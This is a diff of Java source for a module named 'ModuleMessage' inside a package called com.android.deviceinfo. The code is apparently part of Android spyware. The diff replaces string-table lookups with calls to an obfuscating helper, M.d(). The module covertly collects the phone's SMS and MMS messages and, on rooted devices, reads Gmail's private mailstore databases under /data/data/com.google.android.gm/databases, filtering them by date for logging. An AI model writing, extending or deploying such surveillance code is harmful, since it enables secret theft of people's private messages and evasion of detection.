@@ -19,7 +19,6 @@ import java.util.Hashtable;
 import java.util.Iterator;
 import java.util.concurrent.Semaphore;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.Status;
@@ -48,8 +47,8 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.DateTime;
-import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 /**
  * The Class MessageAgent.
@@ -120,12 +119,12 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		try {
 
 			if(Cfg.ENABLE_MAIL_MODULE){
-				mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+				mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, M.d("mail"), conf, config);
 			}else{
 				mailEnabled = false;
 			}
-			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
-			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);
+			smsEnabled = readJson(ID_SMS, M.d("sms"), conf, config);
+			mmsEnabled = readJson(ID_MMS, M.d("mms"), conf, config);
 
 			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
 				storedMAIL.removeMarkup();
@@ -168,17 +167,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private boolean readJson(int id, String child, ConfModule jsonconf, String[] config) throws ConfigurationException {
 		ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
-		boolean enabled = mailJson.getBoolean(Messages.getString("18_2")); //$NON-NLS-1$
+		boolean enabled = mailJson.getBoolean(M.d("enabled")); //$NON-NLS-1$
 		String digestConfMail = child + "_" + enabled;
 
 		if (enabled) {
-			ChildConf filter = mailJson.getChild(Messages.getString("18_3")); //$NON-NLS-1$
-			boolean history = filter.getBoolean(Messages.getString("18_4")); //$NON-NLS-1$
+			ChildConf filter = mailJson.getChild(M.d("filter")); //$NON-NLS-1$
+			boolean history = filter.getBoolean(M.d("history")); //$NON-NLS-1$
 			int maxSizeToLog = 4096;
 			digestConfMail += "_" + history;
 			if (history) {
-				Date from = filter.getDate(Messages.getString("18_5")); //$NON-NLS-1$
-				Date to = filter.getDate(Messages.getString("18_6"), null); //$NON-NLS-1$
+				Date from = filter.getDate(M.d("datefrom")); //$NON-NLS-1$
+				Date to = filter.getDate(M.d("dateto"), null); //$NON-NLS-1$
 				// sizeToLog =
 
 				filterCollect[id] = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
@@ -401,14 +400,14 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		FilenameFilter filterdb = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
 				// i_3=mailstore.
-				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
+				return fileName.endsWith(".db") && fileName.startsWith(M.d("mailstore."));
 			}
 		};
 
 		FilenameFilter filterall = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
 				// i_3=mailstore.
-				return fileName.startsWith(Messages.getString("i_3"));
+				return fileName.startsWith(M.d("mailstore."));
 			}
 		};
 
@@ -426,7 +425,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 			try {
 				// i_1=/data/data/com.google.android.gm/databases
-				String databasePath = Messages.getString("i_1");
+				String databasePath = M.d("/data/data/com.google.android.gm/databases");
 
 				String[] mailstores = getMailStores(databasePath);
 				for (String mailstore : mailstores) {
@@ -446,7 +445,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					visitor.lastId = lastId;
 
 					// i_2=messages
-					// Messages.getString("i_2")
+					// M.d("messages")
 					int newLastId = (int) helper.traverseRecords("messages", visitor);
 					
 					if (Cfg.DEBUG) {
@@ -544,8 +543,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 		final String address = mms.getAddress();
 		// MMS Subject:
-		final byte[] subject = WChar.getBytes(Messages.getString("10_1") + mms.getSubject() + "\n"
-				+ Messages.getString("10_4") + mms.getBody()); //$NON-NLS-1$
+		final byte[] subject = WChar.getBytes(M.d("MMS Subject: ") + mms.getSubject() + "\n"
+				+ M.d("Body: ") + mms.getBody()); //$NON-NLS-1$
 		final long date = mms.getDate();
 
 		final boolean sent = mms.getSent();
@@ -602,11 +601,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		if (sent) {
 			flags = 0;
-			from = Messages.getString("10_2"); //$NON-NLS-1$
+			from = M.d("local"); //$NON-NLS-1$
 			to = address;
 		} else {
 			flags = 1;
-			to = Messages.getString("10_2"); //$NON-NLS-1$
+			to = M.d("local"); //$NON-NLS-1$
 			from = address;
 		}
 
